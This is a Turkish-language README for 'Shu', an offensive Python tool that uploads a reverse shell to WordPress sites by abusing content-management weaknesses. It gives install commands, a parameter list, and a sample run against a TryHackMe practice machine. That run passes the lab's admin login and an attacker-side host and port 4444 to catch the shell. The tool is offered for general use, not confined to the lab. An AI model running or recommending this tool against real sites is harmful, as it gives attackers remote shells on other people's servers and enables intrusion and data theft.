# Shu
Shu, hazır içerik yönetim sistemlerinin zayıflıklarından yararlanarak reverse shell yükleyen bir programdır.

## Programın indirilmesi ve kurulması

```
git clone https://github.com/Narisca/Shu/
cd Shu
pip3 install -r requirements.txt
```

Bu komutları kullanarak programı indirip kurduktan sonra `python3 shu.py --help` komutunu kullanarak programı nasıl çalıştırabileceğinizi öğrenebilirsiniz.

![4](https://github.com/Narisca/Shu/assets/165813191/0efbd39a-d976-461d-ba17-b329aa65b53f)

## Örnek kullanm

Örnek olması amacıyla tryhackme.com platformunda bulunan mr.robot makinesi üzerinde deneyeceğim.

```
python3 shu.py --target http://10.10.236.255/wp-login.php --username elliot --password ER28-0652 --local-host 10.9.0.25 --local-port 4444 --plugin wordpress
```

![3](https://github.com/Narisca/Shu/assets/165813191/9a0ddbf2-1965-4322-affb-a1086365f3ce)

## Parametreler

```
--target-url,  -t    : Hedef sitenin giriş sayfasını belirtmenizi sağlar.
--plugin,      -x    : Hedef sitenin içerik yönetim sistemini belirtmenizi sağlar..
--username,    -u    : Kullanıcı adını belirtmenizi sağlar.
--password,    -p    : Kullanıcı şifresini belirtmenizi sağlar.
--local-host,  -L    : Yerel ağ adresinizi belirtmenizi sağlar.
--local-port,  -P    : Dinlenilen port'u berlirtmenizi sağlar.
```

## Kullanılabilir hazır içerik yönetim sistemleri
- wordpress
